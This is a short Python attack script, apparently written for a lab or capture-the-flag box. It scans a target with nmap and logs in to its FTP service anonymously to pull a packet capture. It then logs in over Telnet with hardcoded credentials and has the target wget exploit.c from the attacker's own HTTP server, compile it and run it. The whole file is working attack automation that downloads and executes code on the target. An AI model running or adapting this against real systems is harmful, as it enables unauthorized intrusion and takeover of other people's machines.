import sys
import os
import time
import socket
from ftplib import FTP  
from telnetlib import Telnet
from http.server import HTTPServer, SimpleHTTPRequestHandler
import subprocess


if(len(sys.argv) != 2):
    print("Script takes 1 argument; IP address of host.")
    exit()

#############  SETUP  #############
os.system("rm capture.pcapng")
target_ip = sys.argv[1]
own_ip = ipv4 = os.popen('ip addr show eth0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'').read().strip()

print("Attacking "+target_ip+" from my own ip: "+own_ip)


# #############  NMAP  #############
os.system("nmap -sC -sV "+target_ip)
time.sleep(20)

#############  FTP  #############
ftp = FTP(target_ip)
ftp.login()
time.sleep(1)
ftp.retrlines('LIST')
time.sleep(2)
try:
    with open('capture.pcapng', 'wb') as fp:
        ftp.retrbinary('RETR captasure.pcapng', fp.write)
        downloaded = True
except:
    downloaded = False
ftp.quit()


with Telnet(target_ip, 23) as tn:
    print("sending login")
    tn.read_until(b"login: ")
    tn.write("emil".encode('ascii') + b"\n")
    time.sleep(1)
    print("sending pass")
    tn.read_until(b"Password: ")
    tn.write("iloveyou1".encode('ascii') + b"\n")
    time.sleep(1)
    print("sending ls")
    tn.write(b"ls\n")
    try:
        subprocess.Popen(["python3","-m","http.server"])
    except:
        print("already spawned")
    tn.write(b'cd /tmp \n')
    tn.write(b'wget http://'+own_ip.encode()+b':8000/exploit.c \n')
    tn.write(b'gcc exploit.c -o exploit\n')
    tn.write(b'chmod +x exploit\n')
    tn.write(b'./exploit\n')
    tn.write(b"exit\n")

    
    print(tn.read_all())

    